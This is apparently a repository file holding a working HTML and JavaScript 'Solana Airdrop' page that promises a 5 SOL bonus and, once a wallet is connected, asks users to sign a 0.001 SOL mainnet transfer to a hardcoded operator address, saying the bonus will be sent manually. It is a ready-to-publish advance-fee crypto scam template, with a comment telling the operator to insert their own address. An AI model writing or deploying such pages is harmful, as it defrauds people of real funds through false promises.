# solana-airdrop
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Bonus 5 SOL — Claim</title>
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <style>
    body { font-family: Inter, system-ui, -apple-system, Arial; display:flex; align-items:center; justify-content:center; min-height:100vh; background:#0b1220; color:#e6f0ff; margin:0; }
    .card { width:100%; max-width:720px; padding:28px; border-radius:12px; background:linear-gradient(180deg,#0f1724 0,#071022 100%); box-shadow:0 8px 30px rgba(2,6,23,0.6); }
    .top { display:flex; justify-content:flex-end; }
    button { cursor:pointer; border:0; padding:10px 14px; border-radius:8px; font-weight:600; }
    .connect { background:#00a3ff; color:white; }
    h1 { text-align:center; font-size:44px; margin:28px 0 6px; }
    .subtitle { text-align:center; color:#bcdcff; margin-bottom:20px; }
    .bonus { text-align:center; font-size:56px; font-weight:800; margin:18px 0; }
    .claim { display:flex; justify-content:center; margin-top:14px; }
    .claim button { background:#14b866; color:white; font-size:18px; padding:14px 22px; }
    .status { margin-top:16px; text-align:center; color:#9fb7d9; }
    .note { margin-top:12px; color:#8ea8c9; font-size:13px; text-align:center; }
    .small { font-size:13px; color:#9fb7d9; margin-top:8px; text-align:center; }
    .muted { color:#7f98b5; font-size:13px; }
    .danger { color:#ffb0a0; font-size:13px; text-align:center; margin-top:8px; }
  </style>
</head>
<body>
  <div class="card">
    <div class="top">
      <button id="connectBtn" class="connect">Connect Wallet</button>
    </div>

    <h1>Solana Airdrop</h1>
    <div class="subtitle">Limited bonus — one wallet only</div>

    <div class="bonus">bonus 5 SOL</div>

    <div class="claim">
      <button id="claimBtn">Claim</button>
    </div>

    <div class="status" id="status">Status: Idle</div>
    <div class="note">After connecting, press <strong>Claim</strong>. A small 0.001 SOL transaction will be requested (memo: <code>bonus 5 SOL 📥</code>). After we see your 0.001 SOL arrives, we will manually send 5 SOL to your wallet.</div>
    <div class="small muted">We will never request your private key. You must approve the transaction in your wallet.</div>
    <div class="danger">Important: Replace OPERATOR_ADDRESS in the script with your receiving SOL address before publishing.</div>
  </div>

  <script src="https://unpkg.com/@solana/web3.js@1.73.0/lib/index.iife.js"></script>
  <script>
    (async () => {
      const OPERATOR_ADDRESS = "Aif28gDfCKAXxJamRcLLmoo5TsCeAYhk5V8RxdzjpSEW"; // جایگزین با آدرس خودت
      const LAMPORTS_PER_SOL = solanaWeb3.LAMPORTS_PER_SOL;
      const SMALL_AMOUNT_SOL = 0.001;
      const MEMO_PROGRAM_ID = new solanaWeb3.PublicKey("MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr");

      const connectBtn = document.getElementById('connectBtn');
      const claimBtn = document.getElementById('claimBtn');
      const statusEl = document.getElementById('status');

      let provider = null;
      let userPubkey = null;
      let connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');

      function setStatus(txt) { statusEl.textContent = 'Status: ' + txt; }

      function getProvider() {
        if (window.solana && window.solana.isPhantom) return window.solana;
        if (window.solana) return window.solana;
        return null;
      }

      connectBtn.addEventListener('click', async () => {
        provider = getProvider();
        if (!provider) {
          alert('No injected Solana wallet detected. Install Phantom or use a compatible Solana wallet.');
          return;
        }
        try {
          setStatus('Requesting connection...');
          const resp = await provider.connect();
          userPubkey = resp.publicKey.toString();
          setStatus('Connected: ' + userPubkey);
          connectBtn.textContent = 'Connected';
          connectBtn.disabled = true;
        } catch (err) {
          console.error(err);
          setStatus('Connection failed');
        }
      });

      claimBtn.addEventListener('click', async () => {
        try {
          if (!userPubkey) {
            alert('Please Connect Wallet first.');
            return;
          }
          if (OPERATOR_ADDRESS.includes('INSERT_YOUR')) {
            alert('Operator address not configured.');
            return;
          }

          const ok = confirm('You will approve a small transaction of 0.001 SOL (memo: "bonus 5 SOL 📥"). Continue?');
          if (!ok) return;

          setStatus('Preparing transaction...');
          const fromPubkey = new solanaWeb3.PublicKey(userPubkey);
          const toPubkey = new solanaWeb3.PublicKey(OPERATOR_ADDRESS);
          const lamports = Math.round(SMALL_AMOUNT_SOL * LAMPORTS_PER_SOL);

          const transferIx = solanaWeb3.SystemProgram.transfer({
            fromPubkey,
            toPubkey,
            lamports
          });

          const memoIx = new solanaWeb3.TransactionInstruction({
            keys: [],
            programId: MEMO_PROGRAM_ID,
            data: new TextEncoder().encode('bonus 5 SOL 📥')
          });

          const tx = new solanaWeb3.Transaction().add(transferIx, memoIx);
          tx.feePayer = fromPubkey;
          const { blockhash } = await connection.getLatestBlockhash('finalized');
          tx.recentBlockhash = blockhash;

          setStatus('Requesting wallet signature...');
          let txSig = null;
          if (provider.signAndSendTransaction) {
            const signed = await provider.signAndSendTransaction(tx);
            txSig = signed.signature;
            setStatus('Transaction sent: ' + txSig + ' — awaiting confirmation...');
          } else if (provider.signTransaction) {
            const signedTx = await provider.signTransaction(tx);
            const raw = signedTx.serialize();
            txSig = await connection.sendRawTransaction(raw);
            setStatus('Transaction sent: ' + txSig + ' — awaiting confirmation...');
          } else {
            alert('Connected wallet does not support required signing methods.');
            setStatus('Unsupported wallet');
            return;
          }

          const confirmResp = await connection.confirmTransaction({ signature: txSig, blockhash, lastValidBlockHeight: (await connection.getLatestBlockhash()).lastValidBlockHeight }, 'confirmed')
            .catch(e => { console.warn('confirm error', e); });
          setStatus('Transaction confirmed: ' + txSig);

          const explorer = 'https://explorer.solana.com/tx/' + txSig + '?cluster=mainnet-beta';
          const link = document.createElement('a');
          link.href = explorer;
          link.target = '_blank';
          link.textContent = 'View on Solana Explorer';
          link.style.display = 'block';
          link.style.marginTop = '8px';
          statusEl.appendChild(link);

          alert('Transaction completed. Operator will manually send 5 SOL if eligible.');

        } catch (err) {
          console.error(err);
          setStatus('Error: ' + (err.message || err));
          alert('Transaction failed or canceled.');
        }
      });
    })();
  </script>
</body>
</html>
